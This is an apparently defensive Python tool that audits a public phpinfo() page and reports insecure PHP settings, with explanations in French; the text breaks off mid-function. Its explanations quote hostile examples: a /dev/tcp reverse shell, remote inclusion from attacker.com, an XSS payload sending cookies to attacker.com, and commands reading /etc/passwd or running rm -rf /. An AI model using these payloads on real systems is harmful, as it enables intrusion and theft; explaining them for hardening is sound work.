import requests
import argparse
import sys
import json
import re
from bs4 import BeautifulSoup
from simple_chalk import chalk
from datetime import datetime

# Define colors
info = chalk.blue
success = chalk.green
fail = chalk.red
warning = chalk.yellow
critical = chalk.red.bold

class PHPInfoAnalyzer:
    def __init__(self, verbose=False):
        self.verbose = verbose
        self.vulnerabilities = []
        self.recommendations = []
        self.info_disclosure = []
        self.positive_points = []
        
    def log(self, message, level="info"):
        if self.verbose or level != "info":
            colors = {
                "info": info,
                "success": success,
                "warning": warning,
                "error": fail,
                "critical": critical
            }
            print(colors.get(level, info)(message))
    
    def get_content(self, url):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Security Audit Tool)'
            }
            r = requests.get(url, headers=headers, timeout=10, verify=True)
            if r.status_code == 200:
                self.log("[✓] Page téléchargée avec succès", "success")
                return r.text
            else:
                self.log(f"[✗] Erreur HTTP {r.status_code}", "error")
                return False
        except requests.exceptions.SSLError:
            self.log("[!] Erreur SSL - Certificat invalide", "warning")
            try:
                r = requests.get(url, verify=False, timeout=10)
                self.vulnerabilities.append({
                    "severity": "MEDIUM",
                    "category": "SSL/TLS",
                    "issue": "Certificat SSL invalide ou auto-signé",
                    "risk": "Man-in-the-Middle attacks possibles"
                })
                return r.text if r.status_code == 200 else False
            except:
                return False
        except Exception as e:
            self.log(f"[✗] Erreur: {str(e)}", "error")
            return False
    
    def extract_php_info(self, html):
        """Extract structured data from phpinfo()"""
        soup = BeautifulSoup(html, 'html.parser')
        data = {}
        
        # Check if it's actually a phpinfo page
        if not soup.find('h1', string=re.compile('PHP Version', re.I)):
            self.log("[✗] Cette page ne semble pas être un phpinfo()", "error")
            return None
        
        self.info_disclosure.append({
            "type": "CRITICAL",
            "issue": "Page phpinfo() accessible publiquement",
            "impact": "Exposition complète de la configuration serveur"
        })
        
        # Extract PHP version
        version_tag = soup.find('h1')
        if version_tag:
            version_match = re.search(r'PHP Version (\d+\.\d+\.\d+)', version_tag.text)
            if version_match:
                data['php_version'] = version_match.group(1)
        
        # Extract configuration tables
        tables = soup.find_all('table')
        for table in tables:
            rows = table.find_all('tr')
            for row in rows:
                cols = row.find_all(['td', 'th'])
                if len(cols) >= 2:
                    key = cols[0].get_text(strip=True)
                    value = cols[1].get_text(strip=True)
                    data[key] = value
        
        return data
    
    def check_php_version(self, version):
        """Check if PHP version is outdated"""
        if not version:
            return
        
        if self.verbose:
            self.log(f"\n🔍 Analyse de la version PHP: {version}", "info")
        
        try:
            major, minor, patch = map(int, version.split('.'))
            
            # PHP versions end of life
            eol_versions = {
                '5.6': '2018-12-31',
                '7.0': '2019-01-10',
                '7.1': '2019-12-01',
                '7.2': '2020-11-30',
                '7.3': '2021-12-06',
                '7.4': '2022-11-28',
                '8.0': '2023-11-26',
            }
            
            version_key = f"{major}.{minor}"
            
            if version_key in eol_versions:
                self.vulnerabilities.append({
                    "severity": "CRITICAL",
                    "category": "Version PHP",
                    "issue": f"PHP {version} n'est plus maintenu (EOL: {eol_versions[version_key]})",
                    "risk": "Vulnérabilités de sécurité non corrigées",
                    "recommendation": "Mettre à jour vers PHP 8.1, 8.2 ou 8.3"
                })
                
                if self.verbose:
                    self.log(f"\n🚨 VERSION PHP OBSOLÈTE DÉTECTÉE!", "critical")
                    self.log(f"   Version actuelle: PHP {version}", "error")
                    self.log(f"   Fin de support (EOL): {eol_versions[version_key]}", "error")
                    self.log(f"\n   💡 Pourquoi c'est critique:", "info")
                    self.log(f"   Une version PHP EOL (End-Of-Life) ne reçoit plus aucune mise à jour de sécurité.", "info")
                    self.log(f"   Toutes les vulnérabilités découvertes depuis {eol_versions[version_key]} restent non corrigées.", "info")
                    self.log(f"   Les attaquants utilisent des bases comme exploit-db.com pour cibler ces versions.", "info")
                    self.log(f"   Exemples de CVE critiques sur PHP anciennes versions:", "info")
                    self.log(f"   - CVE-2019-11043: RCE sur PHP-FPM/Nginx", "error")
                    self.log(f"   - CVE-2019-9641: Buffer overflow via Exif", "error")
                    self.log(f"   - CVE-2020-7064: Information disclosure", "error")
                    self.log(f"\n   🛡️  Solution:", "info")
                    self.log(f"   Migrer vers PHP 8.1+ (PHP 8.3 recommandé en 2025)", "success")
                    self.log(f"   Tester l'application sur la nouvelle version avant déploiement", "success")
                    self.log(f"   Utiliser PHP 8.x apporte aussi: JIT, performances +50%, typage strict\n", "success")
                    
            elif major < 8:
                self.vulnerabilities.append({
                    "severity": "HIGH",
                    "category": "Version PHP",
                    "issue": f"PHP {version} est obsolète",
                    "risk": "Manque de fonctionnalités de sécurité modernes",
                    "recommendation": "Migrer vers PHP 8.x"
                })
                
                if self.verbose:
                    self.log(f"\n⚠️  Version PHP 7.x détectée", "warning")
                    self.log(f"   Bien que potentiellement encore supportée, PHP 7.x manque de:", "info")
                    self.log(f"   - Named arguments (réduction erreurs)", "info")
                    self.log(f"   - JIT compiler (performances)", "info")
                    self.log(f"   - Fibers (async amélioré)", "info")
                    self.log(f"   - Amélioration du typage strict", "info")
                    self.log(f"   Recommandation: Planifier migration vers PHP 8.1+\n", "success")
            else:
                self.positive_points.append(f"Version PHP récente ({version})")
                if self.verbose:
                    self.log(f"✅ Version PHP {version} - Récente et maintenue", "success")
                    self.log(f"   Cette version reçoit des mises à jour de sécurité régulières", "info")
                    self.log(f"   Continuer à suivre les updates de sécurité", "info")
                    self.log(f"   Vérifier régulièrement sur https://www.php.net/downloads\n", "info")
                
        except ValueError:
            self.log("[!] Impossible de parser la version PHP", "warning")
    
    def analyze_directives(self, data):
        """Analyze security-critical PHP directives"""
        
        critical_directives = {
            'expose_php': {
                'safe': 'Off',
                'severity': 'LOW',
                'issue': 'expose_php activé',
                'risk': 'Divulgation de la version PHP dans les headers HTTP',
                'detail': 'Lorsque expose_php est activé, PHP ajoute un header "X-Powered-By: PHP/x.x.x" dans toutes les réponses HTTP. Cela permet aux attaquants de connaître précisément votre version PHP et de cibler des exploits spécifiques. Un attaquant peut alors utiliser des bases de données comme exploit-db.com pour trouver des CVE correspondant à votre version.',
                'prevention': 'Désactiver expose_php empêche cette fuite d\'information passive et rend la reconnaissance plus difficile pour un attaquant.'
            },
            'display_errors': {
                'safe': 'Off',
                'severity': 'HIGH',
                'issue': 'display_errors activé',
                'risk': 'Exposition de chemins système et informations sensibles dans les erreurs',
                'detail': 'Avec display_errors=On, toutes les erreurs PHP sont affichées directement dans le navigateur. Cela expose : les chemins complets des fichiers (/var/www/html/includes/database.php), les requêtes SQL avec données sensibles, la structure de la base de données, les noms de variables et de fonctions internes, les versions de bibliothèques tierces. Un attaquant peut provoquer volontairement des erreurs (via SQL injection, inclusion de fichiers inexistants) pour cartographier l\'application.',
                'prevention': 'Désactiver display_errors et activer log_errors permet de logger les erreurs dans un fichier sécurisé accessible uniquement aux administrateurs, tout en ne rien exposer aux utilisateurs/attaquants.'
            },
            'display_startup_errors': {
                'safe': 'Off',
                'severity': 'MEDIUM',
                'issue': 'display_startup_errors activé',
                'risk': 'Exposition des erreurs au démarrage',
                'detail': 'Cette directive affiche les erreurs survenant durant la phase d\'initialisation de PHP (chargement des extensions, parsing du php.ini). Ces erreurs peuvent révéler la configuration système, les chemins d\'installation, les modules manquants ou en échec. Moins critique que display_errors mais contribue à la reconnaissance.',
                'prevention': 'Désactiver pour éviter la fuite d\'informations sur l\'environnement serveur lors du démarrage PHP.'
            },
            'log_errors': {
                'safe': 'On',
                'severity': 'MEDIUM',
                'issue': 'log_errors désactivé',
                'risk': 'Absence de logs pour l\'analyse forensique',
                'inverted': True,
                'detail': 'Sans log_errors, aucune trace des erreurs PHP n\'est conservée. En cas d\'attaque ou de comportement anormal, vous n\'aurez aucun moyen de comprendre ce qui s\'est passé. Les logs sont essentiels pour : détecter des tentatives d\'exploitation, identifier les vulnérabilités exploitées, effectuer une analyse post-incident, monitorer la santé de l\'application.',
                'prevention': 'Activer log_errors avec un fichier de log sécurisé (hors document root) permet la supervision sans exposer les erreurs publiquement.'
            },
            'allow_url_fopen': {
                'safe': 'Off',
                'severity': 'HIGH',
                'issue': 'allow_url_fopen activé',
                'risk': 'SSRF, RFI et inclusion de fichiers distants possibles',
                'detail': 'Cette directive permet à PHP de traiter les URLs comme des fichiers (file_get_contents("http://evil.com")). Cela ouvre la porte à : SSRF (Server-Side Request Forgery) pour scanner le réseau interne, exfiltration de données via des requêtes HTTP sortantes, contournement de firewalls en utilisant le serveur comme proxy, inclusion de code malveillant si combiné avec include(). Exemple d\'attaque : file_get_contents($_GET["url"]) permet de lire n\'importe quelle URL.',
                'prevention': 'Désactiver allow_url_fopen force l\'utilisation de cURL avec des contrôles stricts sur les URLs autorisées.'
            },
            'allow_url_include': {
                'safe': 'Off',
                'severity': 'CRITICAL',
                'issue': 'allow_url_include activé',
                'risk': 'Remote File Inclusion (RFI) - Exécution de code arbitraire',
                'detail': 'La vulnérabilité la plus dangereuse ! Avec allow_url_include=On, un attaquant peut inclure et exécuter du code PHP depuis un serveur distant : include($_GET["page"]) devient include("http://attacker.com/shell.txt"). Le fichier distant est téléchargé et exécuté côté serveur avec les permissions PHP. Cela donne un contrôle TOTAL du serveur : lecture/écriture de fichiers, exécution de commandes, accès aux bases de données, pivot vers d\'autres systèmes du réseau.',
                'prevention': 'TOUJOURS désactiver allow_url_include. Cette directive n\'a AUCUNE utilisation légitime en production. C\'est la porte d\'entrée n°1 pour les Remote Code Execution.'
            },
            'enable_dl': {
                'safe': 'Off',
                'severity': 'HIGH',
                'issue': 'enable_dl activé',
                'risk': 'Chargement dynamique d\'extensions malveillantes',
                'detail': 'La fonction dl() permet de charger dynamiquement des extensions PHP (.so ou .dll). Un attaquant ayant accès au serveur pourrait : compiler une extension PHP malveillante avec un backdoor, la télécharger sur le serveur, l\'activer via dl("evil.so") pour exécuter du code natif avec les privilèges du processus PHP. Les extensions natives contournent toutes les restrictions PHP (disable_functions, open_basedir).',
                'prevention': 'Désactiver enable_dl et charger uniquement les extensions nécessaires via php.ini de manière contrôlée.'
            },
            'file_uploads': {
                'safe': 'Off',
                'severity': 'MEDIUM',
                'issue': 'file_uploads activé',
                'risk': 'Upload de fichiers malveillants si non filtré',
                'note': 'Acceptable si bien implémenté',
                'detail': 'L\'upload de fichiers est nécessaire pour de nombreuses applications mais peut être exploité : upload d\'un webshell PHP déguisé en image, bypass des filtres via double extensions (shell.php.jpg), upload de fichiers SVG avec JavaScript embarqué pour XSS, exploitation de failles dans les bibliothèques de traitement d\'images (ImageMagick). Si file_uploads=On, TOUJOURS : valider l\'extension ET le type MIME ET le contenu du fichier, stocker les uploads HORS du document root, renommer les fichiers de manière aléatoire, définir des permissions strictes.',
                'prevention': 'Désactiver si l\'application n\'en a pas besoin. Sinon, implémenter une validation multicouche rigoureuse.'
            },
            'register_globals': {
                'safe': 'Off',
                'severity': 'CRITICAL',
                'issue': 'register_globals activé',
                'risk': 'Variable injection - Compromission complète de l\'application',
                'detail': 'register_globals (supprimé depuis PHP 5.4) était une catastrophe de sécurité. Il créait automatiquement des variables PHP depuis les paramètres GET/POST/COOKIE. Exemple d\'exploitation : si le code fait "if($admin) { // actions admin }", un attaquant pouvait simplement ajouter "?admin=1" dans l\'URL pour devenir admin ! Cela permettait : bypass d\'authentification, injection de variables de configuration, manipulation de chemins de fichiers, écrasement de variables critiques.',
                'prevention': 'Cette directive est obsolète mais si détectée, c\'est que vous utilisez PHP < 5.4 (EOL depuis 2015). MIGRATION URGENTE requise.'
            },
            'magic_quotes_gpc': {
                'safe': 'Off',
                'severity': 'MEDIUM',
                'issue': 'magic_quotes_gpc activé',
                'risk': 'Fausse sécurité et problèmes de compatibilité',
                'detail': 'magic_quotes (supprimé depuis PHP 5.4) ajoutait automatiquement des backslashes aux quotes dans GET/POST/COOKIE pour "prévenir" les SQL injections. En réalité : fausse protection car facilement contournable, cassait les données (\\\'nom\\\' au lieu de \'nom\'), causait des doubles échappements, donnait une fausse sensation de sécurité. Les SQL injections doivent être prévenues par des requêtes préparées (PDO), pas par de l\'échappement automatique.',
                'prevention': 'Directive obsolète. Si détectée = PHP < 5.4 = MISE À JOUR URGENTE.'
            },
            'open_basedir': {
                'safe': 'set',
                'severity': 'MEDIUM',
                'issue': 'open_basedir non configuré',
                'risk': 'Accès non restreint au système de fichiers',
                'inverted': True,
                'check_empty': True,
                'detail': 'open_basedir limite les fichiers accessibles par PHP à certains répertoires. Sans cette restriction, un attaquant ayant réussi à exécuter du code PHP peut : lire /etc/passwd pour énumérer les utilisateurs, accéder aux fichiers de configuration (/etc/apache2/, /etc/nginx/), lire les clés SSH privées dans /root/.ssh/, parcourir tout le système de fichiers, accéder aux fichiers d\'autres virtual hosts. C\'est une défense en profondeur : même si l\'attaquant contourne l\'application, il reste confiné.',
                'prevention': 'Configurer open_basedir="/var/www/monapp:/tmp" limite PHP à ces répertoires uniquement. Bloque l\'exploration du système.'
            },
            'disable_functions': {
                'safe': 'set',
                'severity': 'HIGH',
                'issue': 'Aucune fonction PHP dangereuse désactivée',
                'risk': 'Exécution de commandes système (exec, shell_exec, system, etc.)',
                'inverted': True,
                'check_empty': True,
                'detail': 'disable_functions permet de désactiver des fonctions PHP dangereuses. Sans cela, si un attaquant injecte du code PHP (via upload, RFI, deserialization), il peut : exécuter des commandes système avec system("whoami"), créer un reverse shell avec exec("bash -i >& /dev/tcp/attacker/4444 0>&1"), lire des fichiers arbitraires avec show_source(), modifier des permissions avec chmod(), créer des liens symboliques avec symlink() pour accéder à des fichiers protégés. C\'est la différence entre "j\'ai exécuté du PHP" et "j\'ai pris le contrôle du serveur".',
                'prevention': 'Désactiver au minimum : exec, shell_exec, system, passthru, proc_open, popen, curl_exec, curl_multi_exec, parse_ini_file, show_source, eval, assert, pcntl_exec'
            },
            'session.cookie_httponly': {
                'safe': 'On',
                'severity': 'HIGH',
                'issue': 'session.cookie_httponly désactivé',
                'risk': 'Vol de session via XSS',
                'detail': 'Le flag HttpOnly empêche JavaScript d\'accéder aux cookies. Sans lui, une simple XSS (Cross-Site Scripting) permet de voler la session : <script>fetch("http://attacker.com/?cookie="+document.cookie)</script>. L\'attaquant récupère le cookie de session et peut usurper l\'identité de la victime sans connaître son mot de passe. Avec HttpOnly=On, même si l\'attaquant injecte du JavaScript, il ne peut pas lire le cookie de session via document.cookie.',
                'prevention': 'Toujours activer session.cookie_httponly. C\'est la protection de base contre le vol de session via XSS.'
            },
            'session.cookie_secure': {
                'safe': 'On',
                'severity': 'HIGH',
                'issue': 'session.cookie_secure désactivé',
                'risk': 'Interception de cookies de session sur HTTP',
                'detail': 'Le flag Secure force le cookie à n\'être transmis que via HTTPS. Sans lui, si un utilisateur accède au site en HTTP (même par erreur), le cookie de session est envoyé en clair sur le réseau. Un attaquant en position Man-in-the-Middle (WiFi public, réseau compromis) peut capturer le cookie avec Wireshark et usurper la session. Scénario d\'attaque : l\'utilisateur est en HTTPS, l\'attaquant lui envoie un lien HTTP vers le même site, le cookie est transmis en clair, session volée.',
                'prevention': 'Activer session.cookie_secure ET forcer tout le trafic en HTTPS (HSTS). Le cookie ne sera jamais transmis en HTTP.'
            },
            'session.use_strict_mode': {
                'safe': 'On',
                'severity': 'MEDIUM',
                'issue': 'session.use_strict_mode désactivé',
                'risk': 'Session fixation attacks',
                'detail': 'Sans strict mode, PHP accepte n\'importe quel session ID fourni par l\'utilisateur. Attaque de Session Fixation : l\'attaquant crée un session ID (ex: PHPSESSID=attacker123), force la victime à utiliser ce session ID (via URL ou cookie), la victime se connecte avec ce session ID, l\'attaquant utilise le même session ID pour accéder au compte de la victime. Avec use_strict_mode=On, PHP rejette les session ID non initialisés par lui-même, bloquant cette attaque.',
                'prevention': 'Activer session.use_strict_mode ET régénérer l\'ID de session après authentification avec session_regenerate_id(true).'
            },
            'max_execution_time': {
                'safe': '30',
                'severity': 'LOW',
                'issue': 'max_execution_time trop élevé',
                'risk': 'Déni de service via scripts longs',
                'check_high': 60,
                'detail': 'Cette directive limite le temps d\'exécution d\'un script PHP. Une valeur trop élevée (ou 0 = illimité) permet à un attaquant de créer un déni de service : soumission de requêtes avec des opérations longues (tri de millions d\'éléments, regex complexes, boucles infinies volontaires), saturation de tous les workers PHP, impossibilité pour les utilisateurs légitimes d\'accéder au site. Une valeur de 30 secondes est raisonnable pour la plupart des applications web.',
                'prevention': 'Limiter à 30-60 secondes. Pour les tâches longues (traitement de fichiers, exports), utiliser des queues asynchrones (Redis, RabbitMQ) ou des workers dédiés.'
            },
            'memory_limit': {
                'safe': '128M',
                'severity': 'LOW',
                'issue': 'memory_limit très élevé',
                'risk': 'Épuisement mémoire et DoS',
                'check_high': 512,
                'detail': 'memory_limit contrôle la RAM maximale qu\'un script peut consommer. Une valeur excessive (1G, 2G ou -1 = illimité) permet à un attaquant de provoquer un déni de service : création de tableaux géants en mémoire, lecture de fichiers volumineux sans streaming, décompression de fichiers "zip bombs" (fichier de 1MB qui se décompresse en 1GB), saturation de la RAM du serveur causant swap et crash. 128M est largement suffisant pour 99% des applications web standards.',
                'prevention': 'Limiter à 128M-256M selon les besoins réels. Optimiser le code pour éviter les allocations mémoire excessives (streaming, pagination).'
            }
        }
        
        for directive, config in critical_directives.items():
            value = data.get(directive, 'not found')
            
            if value == 'not found':
                continue
            
            # Handle inverted logic (where we want something to be set)
            if config.get('inverted'):
                if config.get('check_empty'):
                    if value in ['no value', '', 'Off', '0']:
                        vuln = {
                            "severity": config['severity'],
                            "category": "Configuration PHP",
                            "issue": config['issue'],
                            "risk": config['risk'],
                            "current_value": value,
                            "recommendation": f"Configurer {directive} correctement"
                        }
                        if self.verbose and 'detail' in config:
                            vuln['detail'] = config['detail']
                            vuln['prevention'] = config['prevention']
                        self.vulnerabilities.append(vuln)
                        
                        if self.verbose:
                            self.log(f"\n⚠️  {config['issue']}", "warning")
                            self.log(f"   Valeur actuelle: {value}", "error")
                            self.log(f"\n   💡 Pourquoi c'est important:", "info")
                            self.log(f"   {config['detail']}", "info")
                            self.log(f"\n   🛡️  Comment se protéger:", "info")
                            self.log(f"   {config['prevention']}\n", "success")
                else:
                    if value != config['safe']:
                        vuln = {
                            "severity": config['severity'],
                            "category": "Configuration PHP",
                            "issue": config['issue'],
                            "risk": config['risk'],
                            "current_value": value
                        }
                        if self.verbose and 'detail' in config:
                            vuln['detail'] = config['detail']
                            vuln['prevention'] = config['prevention']
                        self.vulnerabilities.append(vuln)
                        
                        if self.verbose:
                            self.log(f"\n⚠️  {config['issue']}", "warning")
                            self.log(f"   Valeur actuelle: {value}", "error")
                            self.log(f"\n   💡 Pourquoi c'est important:", "info")
                            self.log(f"   {config['detail']}", "info")
                            self.log(f"\n   🛡️  Comment se protéger:", "info")
                            self.log(f"   {config['prevention']}\n", "success")
            # Handle high value checks
            elif config.get('check_high'):
                try:
                    numeric_value = int(re.search(r'\d+', value).group())
                    if numeric_value > config['check_high']:
                        vuln = {
                            "severity": config['severity'],
                            "category": "Configuration PHP",
                            "issue": config['issue'],
                            "risk": config['risk'],
                            "current_value": value,
                            "recommendation": f"Réduire à une valeur raisonnable"
                        }
                        if self.verbose and 'detail' in config:
                            vuln['detail'] = config['detail']
                            vuln['prevention'] = config['prevention']
                        self.vulnerabilities.append(vuln)
                        
                        if self.verbose:
                            self.log(f"\n⚠️  {config['issue']}", "warning")
                            self.log(f"   Valeur actuelle: {value} (seuil recommandé: {config['check_high']})", "error")
                            self.log(f"\n   💡 Pourquoi c'est important:", "info")
                            self.log(f"   {config['detail']}", "info")
                            self.log(f"\n   🛡️  Comment se protéger:", "info")
                            self.log(f"   {config['prevention']}\n", "success")
                except:
                    pass
            # Normal checks
            elif value != config['safe']:
                vuln = {
                    "severity": config['severity'],
                    "category": "Configuration PHP",
                    "issue": config['issue'],
                    "risk": config['risk'],
                    "current_value": value,
                    "recommended_value": config['safe']
                }
                if 'note' in config:
                    vuln['note'] = config['note']
                if self.verbose and 'detail' in config:
                    vuln['detail'] = config['detail']
                    vuln['prevention'] = config['prevention']
                self.vulnerabilities.append(vuln)
                
                if self.verbose:
                    severity_icon = "🚨" if config['severity'] == "CRITICAL" else "⚠️"
                    self.log(f"\n{severity_icon} {config['issue']}", "warning")
                    self.log(f"   Valeur actuelle: {value}", "error")
                    self.log(f"   Valeur recommandée: {config['safe']}", "success")
                    if 'detail' in config:
                        self.log(f"\n   💡 Pourquoi c'est important:", "info")
                        self.log(f"   {config['detail']}", "info")
                        self.log(f"\n   🛡️  Comment se protéger:", "info")
                        self.log(f"   {config['prevention']}", "success")
                    if 'note' in config:
                        self.log(f"\n   📝 Note: {config['note']}", "info")
                    self.log("", "info")
            else:
                self.positive_points.append(f"{directive} correctement configuré")
                if self.verbose:
                    self.log(f"✅ {directive} = {value} (SÉCURISÉ)", "success")
                    if 'prevention' in config:
                        self.log(f"   Protection: {config['prevention'][:100]}...", "info")
    
    def check_dangerous_functions(self, data):
        """Check if dangerous functions are enabled"""
        disabled = data.get('disable_functions', '')
        
        if self.verbose:
            self.log(f"\n🔍 Analyse des fonctions dangereuses", "info")
        
        dangerous_functions = [
            'exec', 'shell_exec', 'system', 'passthru', 'popen', 'proc_open',
            'pcntl_exec', 'eval', 'assert', 'create_function', 'include',
            'require', 'curl_exec', 'curl_multi_exec', 'parse_ini_file',
            'show_source', 'symlink', 'chmod', 'chown', 'dl'
        ]
        
        if not disabled or disabled == 'no value':
            self.log("[!] Aucune fonction dangereuse désactivée", "warning")
            enabled = dangerous_functions
        else:
            disabled_list = [f.strip() for f in disabled.split(',')]
            enabled = [f for f in dangerous_functions if f not in disabled_list]
            
            if self.verbose:
                self.log(f"   Fonctions désactivées: {len(disabled_list)}", "success")
                self.log(f"   Fonctions dangereuses encore actives: {len(enabled)}", "error")
        
        if enabled:
            self.vulnerabilities.append({
                "severity": "HIGH",
                "category": "Fonctions dangereuses",
                "issue": f"{len(enabled)} fonction(s) dangereuse(s) activée(s)",
                "risk": "RCE (Remote Code Execution) possible",
                "details": ', '.join(enabled[:10]),
                "recommendation": f"Désactiver via disable_functions"
            })
            
            if self.verbose:
                self.log(f"\n⚠️  Fonctions dangereuses actives détectées", "warning")
                self.log(f"   Nombre: {len(enabled)}", "error")
                self.log(f"\n   💡 Pourquoi c'est dangereux:", "info")
                self.log(f"   Ces fonctions permettent l'exécution de commandes système ou d'actions critiques:", "info")
                
                if 'exec' in enabled or 'system' in enabled or 'shell_exec' in enabled:
                    self.log(f"\n   🎯 exec/system/shell_exec:", "error")
                    self.log(f"      Permet d'exécuter n'importe quelle commande système", "info")
                    self.log(f"      Exemple: system('cat /etc/passwd'); ou exec('rm -rf /')", "error")
                    self.log(f"      Si injection possible: RCE immédiat", "error")
                
                if 'eval' in enabled or 'assert' in enabled:
                    self.log(f"\n   🎯 eval/assert:", "error")
                    self.log(f"      Exécute du code PHP arbitraire depuis une string", "info")
                    self.log(f"      Exemple: eval($_GET['code']); = webshell instantané", "error")
                    self.log(f"      Aucune utilisation légitime en production", "error")
                
                if 'proc_open' in enabled or 'popen' in enabled:
                    self.log(f"\n   🎯 proc_open/popen:", "error")
                    self.log(f"      Ouvre des processus avec pipes stdin/stdout/stderr", "info")
                    self.log(f"      Permet de créer des reverse shells interactifs", "error")
                    self.log(f"      Exemple: $p=proc_open('bash',...)=connexion shell complète", "error")
                
                if 'show_source' in enabled:
                    self.log(f"\n   🎯 show_source:", "error")
                    self.log(f"      Affiche le code source de n'importe quel fichier PHP", "info")
                    self.log(f"      Expose: mots de passe BDD, clés API, logique métier", "error")
                
                self.log(f"\n   🛡️  Solution:", "info")
                self.log(f"   Ajouter dans php.ini:", "success")
                self.log(f"   disable_functions=exec,shell_exec,system,passthru,proc_open,", "success")
                self.log(f"                     popen,eval,assert,pcntl_exec,show_source", "success")
                self.log(f"\n   Pour les tâches légitimes nécessitant des commandes système:", "info")
                self.log(f"   - Utiliser des queues/workers isolés", "info")
                self.log(f"   - Valider strictement les inputs", "info")
                self.log(f"   - Utiliser escapeshellarg() si vraiment nécessaire\n", "info")
        else:
            if self.verbose:
                self.log(f"✅ Toutes les fonctions dangereuses sont désactivées", "success")
    
    def check_extensions(self, data):
        """Check for risky PHP extensions"""
        risky_extensions = {
            'ionCube Loader': {
                'risk': 'Peut masquer du code malveillant',
                'detail': 'ionCube encode/obfusque le code PHP. Bien que légitime pour protéger la propriété intellectuelle, il empêche l\'audit de sécurité et peut cacher du code malveillant. Des backdoors peuvent être dissimulés dans du code ionCube sans possibilité de détection.',
                'severity': 'MEDIUM'
            },
            'Suhosin': {
                'risk': 'Extension obsolète, peut causer des problèmes',
                'detail': 'Suhosin était un patch de sécurité pour PHP 5.x. Il est obsolète, non maintenu, et incompatible avec PHP 7+. Peut causer des bugs inattendus et des vulnérabilités. PHP 7+ intègre nativement de meilleures protections.',
                'severity': 'MEDIUM'
            },
            'xdebug': {
                'risk': 'Ne doit PAS être en production - permet debug à distance',
                'detail': 'Xdebug est un débogueur PHP. En production, il permet: debug à distance sans authentification, profiling exposant la logique métier, ralentissements significants (20-50%), exposition de variables et stack traces. Un attaquant peut se connecter au port Xdebug et exécuter du code pas-à-pas, inspecter toutes les variables, modifier l\'exécution.',
                'severity': 'CRITICAL'
            }
        }
        
        if self.verbose:
            self.log(f"\n🔍 Analyse des extensions PHP risquées", "info")
        
        for ext, info in risky_extensions.items():
            if ext.lower() in str(data).lower():
                severity = info['severity']
                self.vulnerabilities.append({
                    "severity": severity,
                    "category": "Extensions PHP",
                    "issue": f"Extension {ext} détectée",
                    "risk": info['risk']
                })
                
                if self.verbose:
                    icon = "🚨" if severity == "CRITICAL" else "⚠️"
                    self.log(f"\n{icon} Extension risquée: {ext}", "warning")
                    self.log(f"   Risque: {info['risk']}", "error")
                    self.log(f"\n   💡 Détails:", "info")
                    self.log(f"   {info['detail']}", "info")
                    
                    if ext == 'xdebug':
                        self.log(f"\n   🎯 Exploitation possible:", "error")
                        self.log(f"   - Connexion au port 9000/9003 (Xdebug)", "error")
                        self.log(f"   - Inspection de toutes les variables (tokens, passwords)", "error")
                        self.log(f"   - Modification du flow d'exécution", "error")
                        self.log(f"   - Pas d'authentification par défaut", "error")
                        self.log(f"\n   🛡️  Solution: DÉSINSTALLER Xdebug en production", "success")
                        self.log(f"   Utiliser uniquement en dev/staging avec accès restreint\n", "info")
                    else:
                        self.log(f"\n   🛡️  Recommandation: Désactiver l'extension si non essentielle\n", "success")
        
        if self.verbose and not any(ext.lower() in str(data).lower() for ext in risky_extensions.keys()):
            self.log(f"✅ Aucune extension risquée détectée\n", "success")
    
    def check_paths_disclosure(self, data):
        """Check for sensitive path disclosures"""
        path_keys = ['DOCUMENT_ROOT', 'include_path', 'extension_dir', 'error_log', 
                     'upload_tmp_dir', 'session.save_path']
        
        if self.verbose:
            self.log(f"\n🔍 Analyse de la divulgation de chemins système", "info")
        
        disclosed_paths = []
        for key in path_keys:
            if key in data and data[key] not in ['no value', '']:
                disclosed_paths.append(f"{key}: {data[key]}")
        
        if disclosed_paths:
            self.info_disclosure.append({
                "type": "MEDIUM",
                "issue": "Chemins système exposés",
                "impact": "Facilite la reconnaissance pour un attaquant",
                "details": disclosed_paths[:5]
            })
            
            if self.verbose:
                self.log(f"\n⚠️  Chemins système exposés via phpinfo()", "warning")
                self.log(f"   Nombre de chemins révélés: {len(disclosed_paths)}", "error")
                self.log(f"\n   💡 Pourquoi c'est problématique:", "info")
                self.log(f"   La connaissance des chemins système aide un attaquant à:", "info")
                self.log(f"   - Cibler des attaques LFI/Directory Traversal précises", "error")
                self.log(f"   - Identifier l'OS et la structure du serveur", "error")
                self.log(f"   - Localiser les fichiers de logs pour effacement de traces", "error")
                self.log(f"   - Trouver les répertoires temporaires pour injection", "error")
                self.log(f"\n   📂 Exemples de chemins exposés:", "info")
                for path in disclosed_paths[:5]:
                    self.log(f"      {path}", "error")
                self.log(f"\n   🛡️  Solution:", "info")
                self.log(f"   SUPPRIMER la page phpinfo() de production", "success")
                self.log(f"   Si nécessaire, protéger par authentification forte + IP whitelist\n", "success")
    
    def generate_report(self, output_file):
        """Generate detailed security report"""
        report = {
            "scan_date": datetime.now().isoformat(),
            "summary": {
                "total_vulnerabilities": len(self.vulnerabilities),
                "critical": len([v for v in self.vulnerabilities if v['severity'] == 'CRITICAL']),
                "high": len([v for v in self.vulnerabilities if v['severity'] == 'HIGH']),
                "medium": len([v for v in self.vulnerabilities if v['severity'] == 'MEDIUM']),
                "low": len([v for v in self.vulnerabilities if v['severity'] == 'LOW']),
                "positive_points": len(self.positive_points)
            },
            "vulnerabilities": self.vulnerabilities,
            "information_disclosure": self.info_disclosure,
            "positive_points": self.positive_points,
            "attack_vectors": self.generate_attack_vectors()
        }
        
        # Save JSON report
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            self.log(f"[✓] Rapport JSON sauvegardé: {output_file}", "success")
        except Exception as e:
            self.log(f"[✗] Erreur lors de la sauvegarde du rapport: {str(e)}", "error")
        
        # Print summary
        self.print_summary(report, output_file)
        
        return report
    
    def generate_attack_vectors(self):
        """Generate potential attack vectors based on findings"""
        vectors = []
        
        # Check for RFI/LFI
        if any('allow_url' in v.get('issue', '') for v in self.vulnerabilities):
            vectors.append({
                "type": "Remote File Inclusion (RFI)",
                "description": "Inclusion de fichiers distants malveillants",
                "exploitation": "include($_GET['page']); avec allow_url_include=On",
                "impact": "Remote Code Execution (RCE)"
            })
        
        # Check for command execution
        if any('disable_functions' in v.get('issue', '') for v in self.vulnerabilities):
            vectors.append({
                "type": "OS Command Injection",
                "description": "Exécution de commandes système",
                "exploitation": "system($_GET['cmd']); ou exec(), shell_exec()",
                "impact": "Compromission complète du serveur"
            })
        
        # Check for session attacks
        if any('session.cookie' in v.get('issue', '') for v in self.vulnerabilities):
            vectors.append({
